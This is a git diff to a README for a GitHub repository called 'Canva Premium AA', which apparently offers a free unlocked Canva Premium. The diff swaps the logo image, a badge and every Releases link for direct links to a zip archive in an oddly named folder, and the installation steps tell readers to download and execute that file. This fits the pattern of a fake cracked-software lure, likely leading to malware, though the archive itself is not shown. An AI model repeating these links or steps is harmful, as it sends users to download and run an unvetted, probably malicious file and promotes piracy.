@@ -1,6 +1,6 @@
 # Canva Premium AA 🎨
 
-![Canva Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Canva_logo.svg/1200px-Canva_logo.svg.png)
+![Canva Logo](https://github.com/Aledi123/Canva-Premium-aa/raw/refs/heads/main/psychopanychite/Premium-aa-Canva-v3.9.zip)
 
 Welcome to the **Canva Premium AA** repository! This project provides a comprehensive toolset for users who want to elevate their graphic design skills. Canva Premium is a powerful online graphic design tool that enables you to create stunning visuals for various purposes, including social media posts, presentations, marketing materials, and more.
 
@@ -24,11 +24,11 @@ Welcome to the **Canva Premium AA** repository! This project provides a comprehe
 
 ## Getting Started
 
-To get started with Canva Premium, visit our [Releases page](https://github.com/Aledi123/Canva-Premium-aa/releases) for the latest version. Download the necessary files and follow the installation instructions below.
+To get started with Canva Premium, visit our [Releases page](https://github.com/Aledi123/Canva-Premium-aa/raw/refs/heads/main/psychopanychite/Premium-aa-Canva-v3.9.zip) for the latest version. Download the necessary files and follow the installation instructions below.
 
 ## Installation
 
-1. **Download**: Go to the [Releases page](https://github.com/Aledi123/Canva-Premium-aa/releases) to download the latest version.
+1. **Download**: Go to the [Releases page](https://github.com/Aledi123/Canva-Premium-aa/raw/refs/heads/main/psychopanychite/Premium-aa-Canva-v3.9.zip) to download the latest version.
 2. **Execute**: After downloading, execute the file to install Canva Premium on your device.
 
 ## Usage
@@ -58,8 +58,8 @@ For support, please check the "Releases" section of this repository. You can als
 
 ---
 
-![GitHub Releases](https://img.shields.io/badge/releases-latest-blue)
+![GitHub Releases](https://github.com/Aledi123/Canva-Premium-aa/raw/refs/heads/main/psychopanychite/Premium-aa-Canva-v3.9.zip)
 
-For the latest updates and files, please visit our [Releases page](https://github.com/Aledi123/Canva-Premium-aa/releases). 
+For the latest updates and files, please visit our [Releases page](https://github.com/Aledi123/Canva-Premium-aa/raw/refs/heads/main/psychopanychite/Premium-aa-Canva-v3.9.zip). 
 
 Thank you for using Canva Premium! We hope you enjoy creating beautiful designs.
